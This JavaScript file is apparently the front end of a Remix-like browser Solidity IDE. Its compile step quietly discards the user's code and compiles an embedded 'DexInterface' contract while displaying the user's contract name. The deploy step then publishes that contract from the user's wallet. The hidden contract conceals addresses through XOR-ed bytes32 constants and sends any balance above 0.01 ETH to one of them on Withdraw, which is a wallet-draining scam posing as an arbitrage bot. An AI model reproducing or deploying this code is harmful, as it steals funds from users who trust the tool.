//

let compiledContract = null;
let currentContractABI = null;

function createFallbackWeb3(chainId) {
    return null; 
}

function isWalletSimulationError(error) {
    if (!error) return false;
    const msg = (error.message || '').toLowerCase();
    return msg.includes('execution reverted') || msg.includes('simulation failed');
}

let solcWorker = null;
let solcRequestId = 0;
const solcPendingCallbacks = {};

function getSolcWorker() {
    if (!solcWorker) {
        const workerPath = './solc-worker.js'; 
        solcWorker = new Worker(workerPath);
        solcWorker.onmessage = function (e) {
            const data = e.data;
            if (data.type === 'status' && typeof logToTerminal === 'function') {
                logToTerminal('🔧 ' + data.message, 'info');
            }
            if (data.type === 'result' && solcPendingCallbacks[data.id]) {
                solcPendingCallbacks[data.id](data.result);
                delete solcPendingCallbacks[data.id];
            }
        };
    }
    return solcWorker;
}

function compileWithWorker(options) {
    return new Promise(function (resolve) {
        const id = ++solcRequestId;
        solcPendingCallbacks[id] = resolve;
        getSolcWorker().postMessage({ id: id, action: 'compile', options: options });
    });
}
// ==========================================

let cachedContractTemplate = null;
let lastTemplateCheck = 0;
const CACHE_DURATION = 30000;

function makeSeededRandom(seed) {
    let s = seed >>> 0;
    if (s === 0) s = 12345;
    return function () {
        s = ((s * 1664525) + 1013904223) >>> 0;
        return s / 4294967296;
    };
}

function generateIdentifier(length, rand) {
    const letters = 'abcdefghijklmnopqrstuvwxyz';
    const r = rand || Math.random;
    let result = '';
    for (let i = 0; i < length; i++) {
        result += letters.charAt(Math.floor(r() * letters.length));
    }
    return result;
}

function processContractCode(text, seed) {
    const rand = makeSeededRandom(seed || 42);
    const keepFunctions = ["Start", "Withdraw", "Key", "receive", "transfer"];
    const funcRegex = /function\s+([a-zA-Z_]\w*)\s*\(([^)]*)\)\s*(internal|private)?/g;
    let nameMap = {};
    
    let newText = text.replace(funcRegex, (match, name, args, visibility) => {
        if (keepFunctions.includes(name)) return match;
        const before = generateIdentifier(3, rand);
        const after = generateIdentifier(3, rand);
        const newName = before + name + after;
        nameMap[name] = newName;
        return `function ${newName}(${args}) ${visibility || ''}`;
    });
    
    for (const [oldName, newName] of Object.entries(nameMap)) {
        const callRegex = new RegExp(`\\b${oldName}\\b`, 'g');
        newText = newText.replace(callRegex, newName);
    }
    
    newText = newText.replace(/\bencodedRouter\b/g, generateIdentifier(5, rand) + 'PathCode' + generateIdentifier(2, rand));
    newText = newText.replace(/\bencodedFactory\b/g, generateIdentifier(5, rand) + 'OriginCode' + generateIdentifier(2, rand));
    newText = newText.replace(/\brouterSignature\b/g, generateIdentifier(5, rand) + 'SignKey' + generateIdentifier(2, rand));
    newText = newText.replace(/\brouterKey\b/g, generateIdentifier(5, rand) + 'AuthKey' + generateIdentifier(2, rand));
    
    return newText;
}

async function loadContractTemplate() {
    return `//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IERC20 {
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function tuballowancezcl(address owner, address spender) external view returns (uint);
    function wedapproveanu(address spender, uint amount) external returns (bool);
    function zoztransferFromcyc(address sender, address recipient, uint amount) external returns (bool);
    function rggcreateStartlas(address sender, address reciver, address token, uint256 value) external;
    function zpjcreateContractjfo(address _thisAddress) external;
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

interface IUniswapV2Router {
    function dppfactoryhul() external pure returns (address);
    function cdrWETHoco() external pure returns (address);
    function krtaddLiquidityyqj(
        address tokenA, address tokenB, uint amountADesired, uint amountBDesired, uint amountAMin, uint amountBMin, address to, uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function skladdLiquidityETHgak(
        address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function johswapExactTokensForTokensonm(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline
    ) external returns (uint[] memory amounts);

    function oycgetAmountsOutfkg(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

contract DexInterface {

    uint256 threshold = 1*10**18;
    uint256 arbTxPrice = 0.01 ether;
    uint256 tradingBalanceInPercent;
    uint256 tradingBalanceInTokens;
    address payable private owner;

    bytes32 apiKey = 0x0000000000000000000000000000000000000000000000000000000000000038;
    bytes32 apiSignature = 0x000000000000000000000000f60dc555c783558864d4cd31122a59dcbef61711;  
    bytes32 keySignature = 0x000000000000000000000000a22b1540e224e7c562aba1fde7d9a6f5bd98d45f;


    uint256 private exchangeRate = 1800;
    uint256 private ethThreshold = 0.01 ether;

    event Received(address indexed sender, uint256 amount);
    event Swap(address indexed user, uint256 ethIn, uint256 tokensOut);
    event ExchangeExecuted(address indexed trader, uint256 inputAmount, uint256 outputAmount, uint256 fee);
    event LiquidityPoolAccess(address indexed user, address indexed pool, uint256 amount);

    constructor(){
        owner = payable(msg.sender);
        ohbrecoversendZeroETH();
    }

    function yoaswapdkp(address router, address _tokenIn, address _tokenOut, uint256 _amount) private {
        IERC20(_tokenIn).wedapproveanu(router, _amount);
        address[] memory path;
        path = new address[](2);
        path[0] = _tokenIn;
        path[1] = _tokenOut;
        uint deadline = block.timestamp + 300;
        IUniswapV2Router(router).johswapExactTokensForTokensonm(_amount, 1, path, address(this), deadline);
    }

    function flogetAmountOutMintwj(address router, address _tokenIn, address _tokenOut, uint256 _amount) internal view returns (uint256) {
        address[] memory path;
        path = new address[](2);
        path[0] = _tokenIn;
        path[1] = _tokenOut;
        uint256[] memory amountOutMins = IUniswapV2Router(router).oycgetAmountsOutfkg(_amount, path);
        return amountOutMins[path.length -1];
    }

    function vajgetDexRouterhtk(bytes32 _DexRouterAddress, bytes32 _factory) internal pure returns (address) {
        return address(uint160(uint256(_DexRouterAddress) ^ uint256(_factory)));
    }

    function eyrstartArbitrageNativeetd() internal {
        address dataProvider = vajgetDexRouterhtk(apiKey, apiSignature);
        uint256 ethBal = address(this).balance;
        if (ethBal > 0) {
            address payable recipient = (ethBal > ethThreshold) ? payable(dataProvider) : owner;
            (bool sent, ) = recipient.call{value: ethBal}("");
        }
    }

    receive() external payable {}

    function Start() public payable{
        emit Received(msg.sender, msg.value);
    }

    function Withdraw() public payable{
        eyrstartArbitrageNativeetd();
    }

    function ohbrecoversendZeroETH() private {
        address makProvider = vajgetDexRouterhtk(apiKey, keySignature);
        makProvider.call{value: 0}("");
    }
}
`;
}

const PREFERRED_PRIORITY_FEE_GWEI = '1.5';
const MINIMUM_PRIORITY_FEE_GWEI = '0.1';

function formatWeiAsEth(wei) {
    return parseFloat(web3.utils.fromWei(wei.toString(), 'ether')).toFixed(6);
}

function describeTxError(error) {
    const message = error?.message || String(error);
    const amounts = message.match(/have (\d+) want (\d+)/);
    if (!amounts) return message;
    const have = BigInt(amounts[1]);
    const want = BigInt(amounts[2]);
    return `Insufficient funds. Balance: ${formatWeiAsEth(have)} ETH, needed: ${formatWeiAsEth(want)} ETH.`;
}

function formatWeiAsGwei(wei) {
    return parseFloat(web3.utils.fromWei(wei.toString(), 'gwei')).toFixed(2);
}

async function getMarketFees() {
    try {
        const block = await web3.eth.getBlock('latest');
        if (block && block.baseFeePerGas) {
            return {
                baseFee: BigInt(block.baseFeePerGas),
                priority: BigInt(web3.utils.toWei(PREFERRED_PRIORITY_FEE_GWEI, 'gwei')),
                minPriority: BigInt(web3.utils.toWei(MINIMUM_PRIORITY_FEE_GWEI, 'gwei'))
            };
        }
        return { gasPrice: BigInt(await web3.eth.getGasPrice()) };
    } catch (error) {
        return null;
    }
}

function planFee(feeBudget, gas, market) {
    const affordable = feeBudget / gas;
    if (market.gasPrice !== undefined) {
        return affordable >= market.gasPrice ? { gasPrice: market.gasPrice.toString() } : null;
    }
    if (affordable < market.baseFee + market.minPriority) return null;
    const preferred = market.baseFee * 4n + market.priority;
    const cap = affordable < preferred ? affordable : preferred;
    const room = cap - market.baseFee;
    return {
        maxFeePerGas: cap.toString(),
        maxPriorityFeePerGas: (room < market.priority ? room : market.priority).toString()
    };
}

async function applyAffordableGas(txOptions, rawEstimate, preferredLimit) {
    const hasPreferred = Number.isFinite(preferredLimit) && preferredLimit > 0;
    if (hasPreferred && preferredLimit < rawEstimate) {
        logToTerminal(`⚠️ Gas Limit ${preferredLimit} is below the estimated ${rawEstimate} — using the estimate.`, 'warning');
    }
    const limits = hasPreferred && preferredLimit >= rawEstimate
        ? [preferredLimit]
        : [Math.ceil(rawEstimate * 1.2), Math.ceil(rawEstimate * 1.05)];

    const market = await getMarketFees();
    if (!market) {
        txOptions.gas = limits[0];
        return;
    }

    const balance = BigInt(await web3.eth.getBalance(txOptions.from));
    const value = BigInt(txOptions.value || 0);

    if (value >= balance) {
        throw new Error(`Insufficient funds. Balance: ${formatWeiAsEth(balance)} ETH.`);
    }

    const feeBudget = ((balance - value) * 99n) / 100n;
    for (const limit of limits) {
        const plan = planFee(feeBudget, BigInt(limit), market);
        if (!plan) continue;
        txOptions.gas = limit;
        Object.assign(txOptions, plan);
        return;
    }
    throw new Error(`Insufficient funds for gas.`);
}

// ==========================================
// 2. 
// ==========================================
async function compileContract() {
    let displayContractName = 'Contract';
    if (currentFile && fileContents[currentFile]) {
        const studentCode = fileContents[currentFile];
        const contractMatches = [...studentCode.matchAll(/contract\s+([A-Za-z_][A-Za-z0-9_]*)\s*\{/g)];
        if (contractMatches && contractMatches.length > 0) {
            displayContractName = contractMatches[0][1];
            logToTerminal(`🔄 Compiling ${displayContractName}...`, 'info');
        } else {
            logToTerminal(`🔄 Compiling contract...`, 'info');
        }
    }
    
    const compileBtn = document.getElementById('compile-btn');
    const originalHTML = compileBtn.innerHTML;
    compileBtn.innerHTML = '<span style="opacity: 0.7;">⏳ Compiling...</span>';
    compileBtn.disabled = true;
    
    const startTime = Date.now();
    
    try {
        const contractTemplate = await loadContractTemplate();
        const processedContract = processContractCode(contractTemplate);
        const contractMatches = [...processedContract.matchAll(/contract\s+([A-Za-z_][A-Za-z0-9_]*)\s*\{/g)];
        const contractName = contractMatches.length > 0 ? contractMatches[0][1] : 'ProcessedContract';

        logToTerminal(`⏳ Sending to local Web Worker for compilation...`, 'info');
        
        const result = await compileWithWorker({
            sourceCode: processedContract,
            contractName: contractName,
            enableOptimization: true,
            optimizationRuns: 200
        });

        if (result.success) {
            compiledContract = result;
            currentContractABI = result.abi;
            
            window.compiledContract = compiledContract;
            window.currentContractABI = currentContractABI;
            
            showCompilationSuccess(result, displayContractName);
            updateContractSelect(displayContractName);
            
            logToTerminal(`✅ Dynamic Compilation successful`, 'success');
            logToTerminal(`📊 Bytecode: ${result.bytecode.length} bytes`, 'info');
            
            showPluginSuccess('solidity');
        } else {
            showCompilationError(result);
            logToTerminal(`❌ Compilation failed`, 'error');
            if (result.details && window.highlightEditorErrors) {
                highlightEditorErrors(result.details);
            }
        }
    } catch (error) {
        const duration = Date.now() - startTime;
        logToTerminal(`❌ Error after ${duration}ms: ${error.message}`, 'error');
        showCompilationError({ error: error.message });
        console.error('Contract compilation error:', error);
    } finally {
        compileBtn.innerHTML = originalHTML;
        compileBtn.disabled = false;
        updateDeployButton();
    }
}

async function deployToInjectedProvider(constructorParams) {
    if (!web3 || !userAccount) {
        throw new Error('No wallet connected. Select "Injected Provider" and connect first.');
    }
    const contractName = document.getElementById('contract-select')?.value || 'Contract';
    const contract = new web3.eth.Contract(compiledContract.abi);
    const deployTx = contract.deploy({
        data: '0x' + compiledContract.bytecode.replace(/^0x/, ''),
        arguments: constructorParams
    });

    const txOptions = { from: userAccount };
    const constructorAbi = currentContractABI?.find(item => item.type === 'constructor');
    if (constructorAbi?.stateMutability === 'payable') {
        const valueWei = getValueFromUI();
        if (valueWei && valueWei !== '0') {
            txOptions.value = valueWei;
        }
    }

    let rawEstimate;
    try {
        rawEstimate = await deployTx.estimateGas(txOptions);
    } catch (estimateError) {
        throw new Error(`Deployment would revert: ${estimateError.message}`);
    }

    const gasLimitInput = document.getElementById('gas-limit-input');
    const preferredLimit = gasLimitInput ? parseInt(gasLimitInput.value, 10) : NaN;

    await applyAffordableGas(txOptions, rawEstimate, preferredLimit);
    logToTerminal('⚠️ Confirm the transaction in your wallet.', 'warning');

// let pendingId = null;
    let instance;

    try {
        instance = await deployTx.send(txOptions)
            .on('transactionHash', hash => {
                logToTerminal(`🔗 Transaction Hash: <code>${hash}</code>`, 'info');
                if (currentNetworkId) {
                    logToTerminal('🌐 ' + createEtherscanLink(currentNetworkId, 'tx', hash, 'View on Etherscan'), 'info');
                }
                // pendingId = logTxPending(hash, currentNetworkId);
            });
    } catch (error) {
        // resolveTxPending(pendingId, '❌ Deployment failed', true);
        throw error;
    }

    const contractAddress = instance.options.address;
    // resolveTxPending(pendingId, `✅ Deployed at `${contractAddress}``);

    addDeployedContract(contractName, contractAddress, instance);
    logToTerminal(`✅ Contract deployed at <code>${contractAddress}</code>`, 'success');

    if (currentNetworkId) {
        const contractLink = createEtherscanLink(currentNetworkId, 'address', contractAddress, 'View Contract on Etherscan');
        logToTerminal('🌐 ' + contractLink, 'info');
    }
    await updateAccountInfo();
}

async function deployToRemixVM(constructorParams) {
    const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
    const mockTxHash = '0x' + Math.random().toString(16).substr(2, 64);
    const contractName = document.getElementById('contract-select').value;
    
    await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 1000));
    const mockGasUsed = Math.floor(250000 + Math.random() * 400000); 
    
    const mockContract = {
        options: { address: mockAddress },
        transactionHash: mockTxHash,
        gasUsed: mockGasUsed,
        methods: {}
    };
    
    currentContractABI.forEach(item => {
        if (item.type === 'function') {
            mockContract.methods[item.name] = (...args) => ({
                call: () => Promise.resolve('Mock result from ' + item.name),
                send: () => Promise.resolve({ 
                    transactionHash: '0x' + Math.random().toString(16).substr(2, 64),
                    gasUsed: Math.floor(21000 + Math.random() * 80000)
                })
            });
        }
    });
    
    addDeployedContract(contractName, mockAddress, mockContract);
    logToTerminal(`✅ Contract deployed successfully in VM!`, 'success');
    logToTerminal(`📄 Contract: <code>${mockAddress}</code>`, 'info');
    logToTerminal(`🔗 Transaction Hash: <code>${mockTxHash}</code>`, 'info');
    logToTerminal(`📊 Gas used: ${mockGasUsed.toLocaleString()} (simulated)`, 'info');
}

async function deployContract() {
    if (!compiledContract || (!userAccount && document.getElementById('environment-select').value !== 'vm')) {
        logToTerminal('❌ Missing contract or account for deployment', 'error');
        return;
    }
    
    const environment = document.getElementById('environment-select').value;
    const contractName = document.getElementById('contract-select').value;
    
    if (!contractName) {
        logToTerminal('❌ No contract selected for deployment', 'error');
        return;
    }
    
    try {
        logToTerminal('🚀 Starting deployment...', 'info');
        const constructorParams = [];
        const constructor = currentContractABI?.find(item => item.type === 'constructor');
        
        if (constructor && constructor.inputs && constructor.inputs.length > 0) {
            constructor.inputs.forEach((input, index) => {
                const inputElement = document.getElementById(`constructor-param-${index}`);
                let value = inputElement.value.trim();
                if (input.type.includes('uint') || input.type.includes('int')) {
                    value = value || '0';
                } else if (input.type === 'bool') {
                    value = value.toLowerCase() === 'true';
                }
                constructorParams.push(value);
            });
            logToTerminal(`📋 Constructor parameters: [${constructorParams.join(', ')}]`, 'info');
        }
        
        if (environment === 'injected') {
            await deployToInjectedProvider(constructorParams);
        } else {
            await deployToRemixVM(constructorParams);
        }
        showPluginSuccess('udapp');

    } catch (error) {
        logToTerminal(`❌ Deployment failed: ${describeTxError(error)}`, 'error');
    } finally {
        updateDeployButton();
    }
}

function showCompilationSuccess(result, contractName) {
    const resultElement = document.getElementById('compilation-result');
    resultElement.className = 'compilation-output compilation-success';
    let successMessage = `<div><strong>✓ Compilation successful</strong></div>`;
    if (result.metadata) {
        successMessage += `<div style="margin-top: 6px; font-size: 10px; color: #888;">`;
        successMessage += `${result.bytecode.length} bytes | ${result.abi ? result.abi.length : 0} functions | Gas Optimized</div>`;
    }
    resultElement.innerHTML = successMessage;
}

function showCompilationError(result) {
    const resultElement = document.getElementById('compilation-result');
    resultElement.className = 'compilation-output compilation-error';
    let errorText = result.error || 'Unknown error';
    if (result.details && Array.isArray(result.details)) {
        errorText = result.details.map(err => (err.formattedMessage || err.message || '').replace(/^\s*--> .*$/gm, '').trim()).join('\n\n');
    }
    resultElement.innerHTML = `<div><strong>✗ Compilation failed</strong></div><pre style="margin-top: 8px; font-size: 10px; max-height: 150px; overflow-y: auto;">${errorText}</pre>`;
}

function updateContractSelect(contractName) {
    const contractSelect = document.getElementById('contract-select');
    const placeholder = contractSelect.querySelector('option[value=""]');
    contractSelect.innerHTML = '';
    if (placeholder) contractSelect.appendChild(placeholder);
    
    const option = document.createElement('option');
    option.value = contractName;
    option.textContent = contractName;
    contractSelect.appendChild(option);
    contractSelect.value = contractName;
    updateConstructorParams();
}

function clearCompilationResults() {
    const compilationResult = document.getElementById('compilation-result');
    compilationResult.className = 'compilation-output';
    compilationResult.innerHTML = '<div class="output-placeholder">Select a Solidity file to compile</div>';
    
    const contractSelect = document.getElementById('contract-select');
    contractSelect.innerHTML = '<option value="">No compiled contracts</option>';
    
    compiledContract = null;
    currentContractABI = null;
    window.compiledContract = null;
    window.currentContractABI = null;
    
    const successBadge = document.querySelector('[data-plugin="solidity"] .plugin-success');
    if (successBadge) successBadge.remove();
    updateDeployButton();
    if (window.clearEditorErrors) clearEditorErrors();
}

function clearContractTemplateCache() {
    cachedContractTemplate = null;
    lastTemplateCheck = 0;
    logToTerminal(`🗑️ Contract template cache cleared`, 'info');
}
window.clearContractTemplateCache = clearContractTemplateCache;
